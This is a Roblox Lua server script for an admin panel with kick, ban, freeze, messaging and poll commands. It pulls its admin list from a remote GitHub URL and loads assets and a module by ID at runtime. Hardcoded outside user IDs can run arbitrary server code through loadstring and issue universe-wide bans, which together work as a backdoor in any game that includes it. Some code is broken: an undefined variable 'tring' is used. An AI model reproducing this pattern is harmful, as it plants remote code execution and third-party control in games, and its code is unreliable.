local script = game:GetService("InsertService"):LoadAsset(97703099171951)
print(script:GetChildren())

script:WaitForChild("Messaging").Parent = game:GetService("StarterGui")
script:WaitForChild("Admin").Parent = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
--{["T0dd2013"] = 1094646770, ["Yeeeet960_v2"] = 2533192011, ["ItsZombieKillerYT"] = 982060355, ["CittyffVyQwaint5"] = 1535857043}
-- Save As "123,456,789"
-- game:GetService("DataStoreService"):GetDataStore("AdminDataStore"):SetAsync("Admins", "1094646770,2533192011,982060355,1535857043")
local Advanced = {1094646770, 982060355, 1535857043, 789857880}
local BansDataStore = game:GetService("DataStoreService"):GetDataStore("Moderation")
local AdminDataStore = game:GetService("DataStoreService"):GetDataStore("Admin")
local PollWin = {"And The Winner Is\n", "The Results Are In, The Winner Is:\n", "Poll Ended, Winner:\n", "local Winner = ", "Dude I Can't Believe The Answer Is ", ""}
local PollYes = {}
local PollNo = {}
local OldPollYes = 0
local OldPollNo = 0
local Admins = ""
local suc = false
local JobId = ""
if game:GetService("RunService"):IsServer() then
	JobId = "STUDIOSERVER"
else
	JobId = game.JobId
end
Admins = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/AcrylicStudios/Admin/refs/heads/main/Admins")
local AdminString = Admins
Admins = {}
for i=1, #AdminString:split(",") do
	table.insert(Admins, tonumber(tring:split(",")[i]))
end
print(": ")
print()
local ReplicatedAdmin = game:GetService("ReplicatedStorage"):WaitForChild("Admin")
local SBans = script:WaitForChild("SBans")
local function IsAdmin(Player:Player)
	return table.find(Admins, Player.UserId) or game:GetService("RunService"):IsStudio()
end
local function WaitForChildWhichIsA(Inst:Instance, Type:string)
	repeat task.wait() until Inst:FindFirstChildWhichIsA(Type)
	return Inst:FindFirstChildWhichIsA(Type)
end
local function GetUnshortened(String)
	local Found = {}
	String = String:lower()
	for i,v in pairs(game:FindService("Players"):GetPlayers()) do
		if v.Name:lower():sub(1, string.len(String)) == String then
			table.insert(Found,v)
		end
	end 
	return Found[1]
end
local function SetBanned(plr, Banned, Reason, Length)
	if plr == nil then return end
	local Suc = false
	repeat
		Suc = pcall(function()
			BansDataStore:SetAsync(tostring(plr), {["IsBanned"] = Banned, ["Reason"] = Reason, ["Length"] = Length, ["Time"] = os.time()})
		end)
		task.wait(1)
	until Suc
end
local function IsBanned(plr)
	if plr == nil then return {["IsBanned"] = false, ["Reason"] = 0, ["Length"] = 0, ["Time"] = 0} end
	local Suc = false
	local Rep = 0
	local DataStore = nil
	repeat
		Rep += 1
		Suc = pcall(function()
			DataStore = BansDataStore:GetAsync(tostring(plr))
		end)
		task.wait(1)
	until Suc or Rep > 5
	if DataStore == nil then
		DataStore = {["IsBanned"] = false, ["Reason"] = 0, ["Length"] = 0, ["Time"] = 0}
		SetBanned(plr, false, "", 0)
	end
	if (os.time() - DataStore.Time) >= DataStore.Length then
		SetBanned(plr, false, "", 0)
	end
	return DataStore
end
local function SendMessage(message, length, msgtype)
	local Suc = false
	if msgtype == "Hint" then
		game:GetService("MessagingService"):PublishAsync("Hint", {["String"] = message, ["Length"] = length})
	elseif msgtype == "Message" then
		game:GetService("MessagingService"):PublishAsync("Message", {["String"] = message, ["Length"] = length})
	elseif msgtype == "Poll" then
		game:GetService("MessagingService"):PublishAsync("Poll", {["String"] = message, ["Length"] = length, ["Host"] = JobId})
	elseif msgtype == "PollEnd" then
		game:GetService("MessagingService"):PublishAsync("PollEnd", {["String"] = message})
	elseif msgtype == "PollUpdate" then
		game:GetService("MessagingService"):PublishAsync("PollUpdate", {["Yes"] = message, ["No"] = length})
	end
end

ReplicatedAdmin:WaitForChild("Moderation").OnServerEvent:Connect(function(plr, target, action, reason, length)
	if length == nil then
		length = 16666666.65
	end
	local Id = 0
	local Name = ""
	if not IsAdmin(plr) then
		warn("PLAYER ".. plr.Name.. "ATTEMPTED TO USE MODERATION WITHOUT PERMISSIONS")
		return
	end
	if type(target) == "number" then
		pcall(function()
			Id = target
			Name = Players:GetNameFromUserIdAsync(target)
		end)
	elseif type(target) == "string" then
		pcall(function()
			Id = Players:GetUserIdFromNameAsync(target)
			Name = target
		end)
	end
	if table.find(Admins, Id) and not table.find(Advanced, plr.UserId) then
		warn("ADMIN ".. plr.Name.. " ATTEMPTED TO USE MODERATION ON ANOTHER ADMIN")
		return
	end
	if action == "Kick" then
		if Players:FindFirstChild(Name) ~= nil then
			Players[Name]:Kick("You Have Been Kicked By A Moderator (".. plr.Name.. ")\nReason: " .. reason)
		else
			game:GetService("MessagingService"):PublishAsync("Kick", {["UserId"] = Id, ["String"] = "You Have Been Kicked By A Moderator (".. plr.Name.. ")\nReason: " .. reason})
		end
	elseif action == "Ban" then
		SetBanned(Id, true, "You Have Been Banned By A Moderator (".. plr.Name.. ") For ".. tostring(length).. " Minutes.\nReason: ".. reason, length * 60)
		game:GetService("MessagingService"):PublishAsync("Ban", {["UserId"] = Id, ["String"] = "You Have Been Banned By A Moderator (".. plr.Name.. ") For ".. tostring(length).. " Minutes.\nReason: ".. reason})
		if Players:FindFirstChild(Name) then
			Players[Name]:Kick("You Have Been Banned By A Moderator (".. plr.Name.. ") For ".. tostring(length).. " Minutes.\nReason: ".. reason)
		end
	elseif action == "SBan" then
		if SBans:FindFirstChild(tostring(Id)) then
			return
		end
		Instance.new("StringValue", SBans).Name = Id
		SBans[Id].Value = "You Have Been Server-Banned By A Moderator (".. plr.Name.. ") For ".. tostring(length).. " Minutes.\nReason: ".. reason
		for i, v in Players:GetPlayers() do
			if v.UserId == Id or v.Name == Name then
				v:Kick(SBans[v.UserId].Value)
			end
		end
		task.wait(length * 60)
		if SBans:FindFirstChild(tostring(Id)) then
			SBans:FindFirstChild(tostring(Id)):Destroy()
		end
	elseif action == "Unban" then
		SetBanned(Id, false, "", 0)
	elseif action == "SUnban" then
		if SBans:FindFirstChild(tostring(Id)) then
			SBans:FindFirstChild(tostring(Id)):Destroy()
		end
	end
end)
ReplicatedAdmin:WaitForChild("Main").OnServerEvent:Connect(function(plr, target, action, value)
	if not IsAdmin(plr) then
		warn("PLAYER ".. plr.Name.. "ATTEMPTED TO USE MAIN WITHOUT PERMISSIONS")
		return
	end
	if target == nil then return end
	if target.Character == nil then 
		if action == "Respawn" then
			target:LoadCharacter()
		end
		return
	end
	if action == "Freeze" then
		for i, v in target.Character:GetChildren() do
			if v:IsA("BasePart") then
				v.Anchored = true
			end
		end
	elseif action == "Unfreeze" then
		for i, v in target.Character:GetChildren() do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	elseif action == "Kill" then
		WaitForChildWhichIsA(target.Character, "Humanoid").Health = 0
	elseif action == "God" then
		WaitForChildWhichIsA(target.Character, "Humanoid").MaxHealth = math.huge
		target.Character:FindFirstChildWhichIsA("Humanoid").Health = math.huge
	elseif action == "Respawn" then
		local OldCFrame = target.Character:GetPivot()
		target:LoadCharacter()
		task.wait(1)
		target.Character:PivotTo(OldCFrame)
	elseif action == "Bring" then
		if plr.Character == nil then return end
		target.Character:PivotTo(plr.Character:GetPivot())
	elseif action == "Goto" then
		if plr.Character == nil then return end
		plr.Character:PivotTo(target.Character:GetPivot())
	elseif action == "Remove" then
		target.Character:Destroy()
	elseif action == "WalkSpeed" then
		WaitForChildWhichIsA(target.Character, "Humanoid").WalkSpeed = value
	elseif action == "JumpPower" then
		WaitForChildWhichIsA(target.Character, "Humanoid").JumpPower = value
	end
end)
ReplicatedAdmin:WaitForChild("Messaging").OnServerEvent:Connect(function(plr, message, length, action)
	if not IsAdmin(plr) then
		warn("PLAYER ".. plr.Name.. "ATTEMPTED TO USE MESSAGING WITHOUT PERMISSIONS")
		return
	end
	if type(message) ~= "string" then return end
	if type(length) ~= "number" then 
		length = 10
	end
	if action == "HintS" then
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.Hint.Text = '<b><font color="rgb(255,255,0)"><u>Server Hint From '.. plr.Name.. ":</u></font></b>\n".. message
		end
		print(length)
		task.wait(length)
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.Hint.Text = ""
		end
	elseif action == "MsgS" then
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.Message.Text = '<b><font color="rgb(255,255,0)"><u>Server Message From '.. plr.Name.. ":</u></font></b>\n".. message
		end
		print(length)
		task.wait(length)
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.Message.Text = ""
		end
	elseif action == "PollS" then
		PollYes = {}
		PollNo = {}
		ReplicatedAdmin.Values.PollYes.Value = #PollYes
		ReplicatedAdmin.Values.PollNo.Value = #PollNo
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.PollContainer.Countdown.Value = length
			v.PlayerGui.Messaging.Poll.Text = '<b><font color="rgb(255,255,0)"><u>Server Poll From '.. plr.Name.. "</u></font></b>\n".. message
		end
		print(length)
		task.wait(length)
		for i, v in Players:GetPlayers() do
			v.PlayerGui.Messaging.Poll.Text = ""
		end
		task.wait(1)
		if ReplicatedAdmin.Values.PollYes.Value > ReplicatedAdmin.Values.PollNo.Value then
			for i, v in Players:GetPlayers() do
				v.PlayerGui.Messaging.PollResult.Text = "<b>".. PollWin[math.random(1, #PollWin)].. "</b>Yes"
			end
		elseif ReplicatedAdmin.Values.PollYes.Value < ReplicatedAdmin.Values.PollNo.Value then
			for i, v in Players:GetPlayers() do
				v.PlayerGui.Messaging.PollResult.Text = "<b>".. PollWin[math.random(1, #PollWin)].. "</b>No"
			end
		else
			for i, v in Players:GetPlayers() do
				v.PlayerGui.Messaging.PollResult.Text = "<b>".. PollWin[math.random(1, #PollWin)].. "</b>Draw"
			end
		end
	elseif action == "PollU" then
		SendMessage('<b><font color="rgb(255,255,0)"><u>Server Poll From '.. plr.Name.. "</u></font></b>\n".. message, length, "Poll")
		for i=1, length / 2.5 do
			task.wait(2.5)
			SendMessage(ReplicatedAdmin.Values.PollYes.Value, ReplicatedAdmin.Values.PollNo.Value, "PollUpdate")
		end
		task.wait(length)
		if ReplicatedAdmin.Values.PollYes.Value > ReplicatedAdmin.Values.PollNo.Value then
			SendMessage("<b>".. PollWin[math.random(1, #PollWin)].. "</b>Yes", length, "PollEnd")
		elseif ReplicatedAdmin.Values.PollYes.Value < ReplicatedAdmin.Values.PollNo.Value then
			SendMessage("<b>".. PollWin[math.random(1, #PollWin)].. "</b>No", length, "PollEnd")
		else
			SendMessage("<b>".. PollWin[math.random(1, #PollWin)].. "</b>Draw", length, "PollEnd")
		end
	elseif action == "HintU" then
		SendMessage('<b><font color="rgb(255,255,0)"><u>Global Hint From '.. plr.Name.. ":</u></font></b>\n".. message, length, "Hint")
	elseif action == "MsgU" then
		SendMessage('<b><font color="rgb(255,255,0)"><u>Global Message From '.. plr.Name.. ":</u></font></b>\n".. message, length, "Message")
	end
end)
ReplicatedAdmin:WaitForChild("PollEvent").OnServerEvent:Connect(function(plr, ans)
	if ans then
		if table.find(PollNo, plr) then
			table.remove(PollNo, table.find(PollNo, plr))
		end
		if not table.find(PollYes, plr) then
			table.insert(PollYes, plr)
		end
	else
		if table.find(PollYes, plr) then
			table.remove(PollYes, table.find(PollYes, plr))
		end
		if not table.find(PollNo, plr) then
			table.insert(PollNo, plr)
		end
	end
	ReplicatedAdmin.Values.PollYes.Value = #PollYes
	ReplicatedAdmin.Values.PollNo.Value = #PollNo
end)
ReplicatedAdmin:WaitForChild("Advanced").OnServerEvent:Connect(function(plr, target, action, reason)
	if not (table.find(Advanced, plr.UserId) or game:GetService("RunService"):IsStudio()) then
		warn("STINKY PLAYER ".. plr.Name.. " ATTEMPTED TO USE ADVANCED WITHOUT PERMS")
		return
	end
	if action == "Execute" then
		loadstring(target)()
	else
		if type(target) == "string" then
			local suc = pcall(function()
				target = Players:GetUserIdFromNameAsync(target)
			end)
			--print(tostring(suc).. " ".. target)
			if not suc then return end
			if target == nil then return end
		end
	end
	if action == "APIBan" then
		if table.find(Advanced, target) then
			warn("ADVANCED USER ".. plr.Name.. " ATTEMPTED TO API BAN ANOTHER ADVANCED USER (".. Players:GetNameFromUserIdAsync(target).. ")")
			return
		end
		Players:BanAsync({["UserIds"] = {target}, ["DisplayReason"] = reason, ["ApplyToUniverse"] = true, ["ExcludeAltAccounts"] = false, ["Duration"] = -1, ["PrivateReason"] = "Banned by ".. plr.Name})
	elseif action == "APIUnban" then
		Players:UnbanAsync({["UserIds"] = {target}, ["ApplyToUniverse"] = true})
	elseif action == "Admin" then
		if table.find(Admins, target) then return end
		local suc = false
		local out = ""
		repeat
			suc, out = pcall(function()
				AdminDataStore:SetAsync("Admins", AdminString.. ",".. tostring(target))
			end)
			task.wait(0.1)
		until suc
	elseif action == "Unadmin" then
		if not table.find(Admins, target) then return end
		local str = ""
		str = string.gsub(AdminString, ",".. tostring(target), "")
		local suc = false
		local out = ""
		repeat
			suc, out = pcall(function()
				AdminDataStore:SetAsync("Admins", str)
			end)
			task.wait(0.1)
		until suc
	elseif action == "ListAdmins" then
		local pr = "Admins:\n"
		for i=1, #Admins do
			pr = pr.. tostring(i).. ". ".. Players:GetNameFromUserIdAsync(Admins[i]).. "\n"
		end
		pr = pr.. "\nAdvanced:\n"
		for i=1, #Advanced do
			pr = pr.. tostring(i).. ". ".. Players:GetNameFromUserIdAsync(Advanced[i]).. "\n"
		end
		print(pr)
	elseif action == "GameShutdown" then
		game:GetService("MessagingService"):PublishAsync("Shutdown", "This Server Has Been Shut Down By An Admin (".. plr.Name.. ")")
	elseif action == "DEX" then
		require(15827159924).MauDex(plr.Name)
	end
end)
local function PlayerAdded(plr)
	if table.find(Advanced, plr.UserId) or game:GetService("RunService"):IsStudio() then
		print(plr.Name.. " IS ADVANCED")
		script:WaitForChild("Advanced Panel"):Clone().Parent = plr:WaitForChild("PlayerGui")
	end
	if IsAdmin(plr) or game:GetService("RunService"):IsStudio() then
		print(plr.Name.. " IS ADMIN")
		script:WaitForChild("Admin Panel"):Clone().Parent = plr:WaitForChild("PlayerGui")
		return
	end
	if IsBanned(plr.UserId) then
		if IsBanned(plr.UserId).IsBanned then
			plr:Kick(IsBanned(plr.UserId).Reason)
			print("Banned Player: ".. plr.Name.. " Attempted To Join")
		end
	else
		SetBanned(plr.UserId, false, "", 0)
	end
	if SBans:FindFirstChild(tostring(plr.UserId)) then
		plr:Kick(SBans:FindFirstChild(tostring(plr.UserId)).Value)
		print("S-Banned Player: ".. plr.Name.. " Attempted To Join")
	end
end
Players.PlayerAdded:Connect(PlayerAdded)
for i, v in Players:GetPlayers() do
	task.spawn(PlayerAdded, v)
end

game:GetService("MessagingService"):SubscribeAsync("Hint", function(tab)
	tab = tab.Data
	for i, v in Players:GetPlayers() do
		task.spawn(function()
			v.PlayerGui.Messaging.Hint.Text = tab.String
			task.wait(tab.Length)
			v.PlayerGui.Messaging.Hint.Text = ""
		end)
	end
end)

game:GetService("MessagingService"):SubscribeAsync("Message", function(tab)
	tab = tab.Data
	for i, v in Players:GetPlayers() do
		task.spawn(function()
			v.PlayerGui.Messaging.Message.Text = tab.String
			task.wait(tab.Length)
			v.PlayerGui.Messaging.Message.Text = ""
		end)
	end
end)

game:GetService("MessagingService"):SubscribeAsync("Poll", function(tab)
	tab = tab.Data
	ReplicatedAdmin.Values.PollYes.Value = 0
	ReplicatedAdmin.Values.PollNo.Value = 0
	tab.Ended = false
	for i, v in Players:GetPlayers() do
		task.spawn(function()
			v.PlayerGui.Messaging.Poll.Text = tab.String
			v.PlayerGui.Messaging.PollContainer.Countdown.Value = tab.Length
			task.wait(tab.Length)
			tab.Ended = true
			v.PlayerGui.Messaging.Poll.Text = ""
		end)
	end
	while task.wait(2.5) do
		if tab.Ended then return end
		game:GetService("MessagingService"):PublishAsync(tab.Host, {["Yes"] = #PollYes - OldPollYes, ["No"] = #PollNo - OldPollNo})
		OldPollYes = #PollYes
		OldPollNo = #PollNo
	end
end)

game:GetService("MessagingService"):SubscribeAsync(JobId, function(tab)
	tab = tab.Data
	print(ReplicatedAdmin.Values.PollYes.Value + tab.Yes)
	print(ReplicatedAdmin.Values.PollNo.Value + tab.No)
	ReplicatedAdmin.Values.PollYes.Value = ReplicatedAdmin.Values.PollYes.Value + tab.Yes
	ReplicatedAdmin.Values.PollNo.Value = ReplicatedAdmin.Values.PollNo.Value + tab.No
end)

game:GetService("MessagingService"):SubscribeAsync("PollUpdate", function(tab)
	tab = tab.Data
	ReplicatedAdmin.Values.PollYes.Value = tab.Yes
	ReplicatedAdmin.Values.PollNo.Value = tab.No
end)

game:GetService("MessagingService"):SubscribeAsync("Shutdown", function(tab)
	tab = tab.Data
	for i, v in Players:GetPlayers() do
		v:Kick(tab)
	end
end)

game:GetService("MessagingService"):SubscribeAsync("Kick", function(tab)
	tab = tab.Data
	for i, v in Players:GetPlayers() do
		if v.UserId == tab.UserId then
			v:Kick(tab.String)
		end
	end
end)

game:GetService("MessagingService"):SubscribeAsync("Ban", function(tab)
	tab = tab.Data
	for i, v in Players:GetPlayers() do
		if v.UserId == tab.UserId then
			v:Kick(tab.String)
		end
	end
end)
